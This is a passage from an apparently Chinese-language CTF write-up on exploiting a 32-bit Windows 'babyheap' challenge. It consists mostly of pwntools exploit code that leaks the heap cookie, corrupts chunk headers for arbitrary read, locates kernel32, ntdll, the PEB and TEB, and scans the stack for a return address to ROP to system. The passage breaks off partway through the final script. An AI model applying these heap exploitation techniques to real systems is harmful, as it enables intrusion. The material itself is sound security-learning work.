</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;C&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 2</span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;D&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 3</span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;D&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 4</span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;D&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 5</span>
</span></span><span style=display:flex><span>show(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;B&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span>)
</span></span><span style=display:flex><span>xored_header <span style=color:#666>=</span> u64((sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\r\n</span><span style=color:#4070a0>&#34;</span>, drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>, <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#34;</span>))[:<span style=color:#40a070>7</span>] 
</span></span><span style=display:flex><span>                    <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x08</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>cookie <span style=color:#666>=</span> xor(xored_header, <span style=color:#40a070>0x0800000809010008</span>)
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;xored header: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(xored_header))
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># cookie leaked</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;cookie: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(cookie))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span> <span style=color:#666>+</span> p64(xor(cookie, <span style=color:#40a070>0x0800000808000008</span>))
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p32(note_array_addr <span style=color:#666>+</span> <span style=color:#40a070>0x4</span>) <span style=color:#666>+</span> p32(note_array_addr <span style=color:#666>+</span> <span style=color:#40a070>0x8</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>4</span>)
</span></span><span style=display:flex><span>edit(<span style=color:#40a070>1</span>, <span style=color:#40a070>0x50</span>, payload <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>1</span>)
</span></span></code></pre></div><h4 id=漫长的-leak-之路>漫长的 leak 之路</h4><p>之后就是要 leak 出 stack_addr，一般选择使用 teb 表中存有的栈指针来 leak</p><p><img src=https://www.cjovi.icu/usr/uploads/2022/04/3354459193.png alt=teb></p><p>而 teb 表和 peb 表的偏移通常是固定的，在 WinDbg 中，通过 r 指令即可查看</p><p><img src=https://www.cjovi.icu/usr/uploads/2022/04/1704517607.png alt="teb and peb"></p><p>而 peb 则在 ntdll 中的 PebLdr 附近固定偏移处存有一个指针</p><p><img src=https://www.cjovi.icu/usr/uploads/2022/04/1353683590.png alt=PebLdr></p><p>所以我们只要 leak 出 ntdll 的地址就可以获得栈地址了。遗憾的是，babyheap 并没有从 ntdll 直接导入函数</p><p><img src=https://www.cjovi.icu/usr/uploads/2022/04/860296172.png alt="import table"></p><p>不过可以看到它导入了 KERNEL32 的函数，而 KERNEL32 导入了大量 ntdll 的函数，所以我们读取对于的 IAT，获得 KERNEL32 的基地址，再读其 IAT 获得 ntdll 基地址最后就可以获得 stack addr 了。</p><p>另外，通过 image 导入的 crt 函数，如 puts 我们可以 leak 出 system 的地址</p><p>这里的脚本为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># then follow the long leaking process</span>
</span></span><span style=display:flex><span>HeapCreate_IAT <span style=color:#666>=</span> image_base <span style=color:#666>+</span> <span style=color:#40a070>0x3000</span>
</span></span><span style=display:flex><span>edit(<span style=color:#40a070>2</span>, <span style=color:#40a070>0x50</span>, p32(note_array_addr <span style=color:#666>+</span> <span style=color:#40a070>0xC</span>) <span style=color:#666>+</span> p32(HeapCreate_IAT) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>show(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Show : &#34;</span>)
</span></span><span style=display:flex><span>HeapCreate_addr <span style=color:#666>=</span> u32(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>4</span>))
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;HeapCreate_addr: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(HeapCreate_addr))
</span></span><span style=display:flex><span>kernel32dll_base <span style=color:#666>=</span> HeapCreate_addr <span style=color:#666>-</span> <span style=color:#40a070>0x11FD0</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;kernel32dll_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(kernel32dll_base))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>NtCreateFile_IAT <span style=color:#666>=</span> kernel32dll_base <span style=color:#666>+</span> <span style=color:#40a070>0x719BC</span>
</span></span><span style=display:flex><span>edit(<span style=color:#40a070>2</span>, <span style=color:#40a070>0x50</span>, p32(NtCreateFile_IAT) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>show(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Show : &#34;</span>)
</span></span><span style=display:flex><span>NtCreateFile_addr <span style=color:#666>=</span> u32(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>4</span>))
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;NtCreateFile_addr: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(NtCreateFile_addr))
</span></span><span style=display:flex><span>ntdll_base <span style=color:#666>=</span> NtCreateFile_addr <span style=color:#666>-</span> <span style=color:#40a070>0x6FBD0</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;ntdll_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(ntdll_base))
</span></span><span style=display:flex><span>PebLdr_addr <span style=color:#666>=</span> ntdll_base <span style=color:#666>+</span> <span style=color:#40a070>0x11FC40</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>peb_stored_addr <span style=color:#666>=</span> PebLdr_addr <span style=color:#666>-</span> <span style=color:#40a070>0x34</span>
</span></span><span style=display:flex><span>edit(<span style=color:#40a070>2</span>, <span style=color:#40a070>0x50</span>, p32(peb_stored_addr) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>show(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Show : &#34;</span>)
</span></span><span style=display:flex><span>peb_addr <span style=color:#666>=</span> u32(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\r\n</span><span style=color:#4070a0>&#34;</span>, drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>4</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)[:<span style=color:#40a070>4</span>]) <span style=color:#666>-</span> <span style=color:#40a070>0x21c</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;peb_addr: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(peb_addr))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>teb_addr <span style=color:#666>=</span> peb_addr <span style=color:#666>+</span> <span style=color:#40a070>0x3000</span>
</span></span><span style=display:flex><span>edit(<span style=color:#40a070>2</span>, <span style=color:#40a070>0x50</span>, p32(teb_addr) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>show(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Show : &#34;</span>)
</span></span><span style=display:flex><span>stack_end <span style=color:#666>=</span> u32(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\r\n</span><span style=color:#4070a0>&#34;</span>, drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>4</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)[:<span style=color:#40a070>4</span>])
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;stack_end: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(stack_end))
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;start search return addr&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>edit(<span style=color:#40a070>2</span>, <span style=color:#40a070>0x50</span>, p32(image_base <span style=color:#666>+</span> <span style=color:#40a070>0x30C8</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>show(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Show : &#34;</span>)
</span></span><span style=display:flex><span>puts_addr <span style=color:#666>=</span> u32(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\r\n</span><span style=color:#4070a0>&#34;</span>, drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>4</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)[:<span style=color:#40a070>4</span>])
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;puts_addr: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(puts_addr))
</span></span><span style=display:flex><span>system_addr <span style=color:#666>=</span> puts_addr <span style=color:#666>-</span> <span style=color:#40a070>0x100B89F0</span> <span style=color:#666>+</span> <span style=color:#40a070>0x100EFDA0</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;system_addr: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(system_addr))
</span></span></code></pre></div><p>然后需要搜索栈，获得 main_ret 的地址，从后往前搜，搜到 main 函数返回的那个地址即可，这里是 <code>image_base + 0x193B</code>，这个过程需要挺长时间的</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>read_every_where</span>(addr):
</span></span><span style=display:flex><span>    edit(<span style=color:#40a070>2</span>, <span style=color:#40a070>0x50</span>, p32(addr) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>    show(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Show : &#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> u32(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\r\n</span><span style=color:#4070a0>&#34;</span>, drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>)[:<span style=color:#40a070>4</span>]<span style=color:#666>.</span>ljust(<span style=color:#40a070>4</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>main_ret_val <span style=color:#666>=</span> image_base <span style=color:#666>+</span> <span style=color:#40a070>0x193B</span>
</span></span><span style=display:flex><span>main_ret_addr <span style=color:#666>=</span> (stack_end <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFFF000</span>) <span style=color:#666>+</span> <span style=color:#40a070>0x1000</span> <span style=color:#666>-</span> <span style=color:#40a070>0x4</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>while</span> <span style=color:#40a070>1</span>:
</span></span><span style=display:flex><span>    ret_val <span style=color:#666>=</span> read_every_where(main_ret_addr)
</span></span><span style=display:flex><span>    log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;in &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(main_ret_addr) <span style=color:#666>+</span> <span style=color:#4070a0>&#34; : &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(ret_val))
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> ret_val <span style=color:#666>==</span> main_ret_val:
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>break</span>
</span></span><span style=display:flex><span>    main_ret_addr <span style=color:#666>=</span> main_ret_addr <span style=color:#666>-</span> <span style=color:#40a070>0x4</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;found main_ret_addr: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(main_ret_addr))
</span></span></code></pre></div><p>找到之后 rop 即可，32 位 X86 是栈传参，gadget 也省得找了</p><p>最后的 exp:</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>operator</span> <span style=color:#007020;font-weight:700>import</span> xor
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># context.log_level = &#34;debug&#34;</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;192.168.124.133&#34;</span>, <span style=color:#40a070>8888</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>add</span>(size, payload):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice?&#34;</span>, <span style=color:#4070a0>&#34;1&#34;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;long is your sword?&#34;</span>, <span style=color:#007020>str</span>(size))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;Name it!&#34;</span>, payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>delete</span>(index):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice?&#34;</span>, <span style=color:#4070a0>&#34;2&#34;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;to destroy?&#34;</span>, <span style=color:#007020>str</span>(index))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>edit</span>(index, size, payload):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice?&#34;</span>, <span style=color:#4070a0>&#34;3&#34;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;polish?&#34;</span>, <span style=color:#007020>str</span>(index))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;time?&#34;</span>, <span style=color:#007020>str</span>(size))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;name it again : &#34;</span>, payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>show</span>(index):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice?&#34;</span>, <span style=color:#4070a0>&#34;4&#34;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;check?&#34;</span>, <span style=color:#007020>str</span>(index))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>read_every_where</span>(addr):
</span></span><span style=display:flex><span>    edit(<span style=color:#40a070>2</span>, <span style=color:#40a070>0x50</span>, p32(addr) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>    show(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Show : &#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> u32(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\r\n</span><span style=color:#4070a0>&#34;</span>, drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>)[:<span style=color:#40a070>4</span>]<span style=color:#666>.</span>ljust(<span style=color:#40a070>4</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>raw_input()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;village gift : &#34;</span>)
</span></span><span style=display:flex><span>image_base <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>), base <span style=color:#666>=</span> <span style=color:#40a070>16</span>) <span style=color:#666>-</span> <span style=color:#40a070>0x1090</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;image_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(image_base))
</span></span><span style=display:flex><span>note_array_addr <span style=color:#666>=</span> image_base <span style=color:#666>+</span> <span style=color:#40a070>0x4370</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;A&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 0</span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;B&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 1</span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;C&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 2</span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;D&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 3</span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;D&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 4</span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;D&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 5</span>
</span></span><span style=display:flex><span>show(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;B&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span>)
</span></span><span style=display:flex><span>xored_header <span style=color:#666>=</span> u64((sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\r\n</span><span style=color:#4070a0>&#34;</span>, drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>, <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#34;</span>))[:<span style=color:#40a070>7</span>] 
</span></span><span style=display:flex><span>                    <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x08</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>cookie <span style=color:#666>=</span> xor(xored_header, <span style=color:#40a070>0x0800000809010008</span>)
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;xored header: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(xored_header))
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># cookie leaked</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;cookie: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(cookie))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span> <span style=color:#666>+</span> p64(xor(cookie, <span style=color:#40a070>0x0800000808000008</span>))
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p32(note_array_addr <span style=color:#666>+</span> <span style=color:#40a070>0x4</span>) <span style=color:#666>+</span> p32(note_array_addr <span style=color:#666>+</span> <span style=color:#40a070>0x8</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>4</span>)
</span></span><span style=display:flex><span>edit(<span style=color:#40a070>1</span>, <span style=color:#40a070>0x50</span>, payload <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># then follow the long leaking process</span>
</span></span><span style=display:flex><span>HeapCreate_IAT <span style=color:#666>=</span> image_base <span style=color:#666>+</span> <span style=color:#40a070>0x3000</span>
</span></span><span style=display:flex><span>edit(<span style=color:#40a070>2</span>, <span style=color:#40a070>0x50</span>, p32(note_array_addr <span style=color:#666>+</span> <span style=color:#40a070>0xC</span>) <span style=color:#666>+</span> p32(HeapCreate_IAT) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>show(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Show : &#34;</span>)
</span></span><span style=display:flex><span>HeapCreate_addr <span style=color:#666>=</span> u32(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>4</span>))
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;HeapCreate_addr: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(HeapCreate_addr))
</span></span><span style=display:flex><span>kernel32dll_base <span style=color:#666>=</span> HeapCreate_addr <span style=color:#666>-</span> <span style=color:#40a070>0x11FD0</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;kernel32dll_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(kernel32dll_base))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>NtCreateFile_IAT <span style=color:#666>=</span> kernel32dll_base <span style=color:#666>+</span> <span style=color:#40a070>0x719BC</span>
</span></span><span style=display:flex><span>edit(<span style=color:#40a070>2</span>, <span style=color:#40a070>0x50</span>, p32(NtCreateFile_IAT) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>show(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Show : &#34;</span>)
</span></span><span style=display:flex><span>NtCreateFile_addr <span style=color:#666>=</span> u32(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>4</span>))
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;NtCreateFile_addr: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(NtCreateFile_addr))
</span></span><span style=display:flex><span>ntdll_base <span style=color:#666>=</span> NtCreateFile_addr <span style=color:#666>-</span> <span style=color:#40a070>0x6FBD0</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;ntdll_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(ntdll_base))
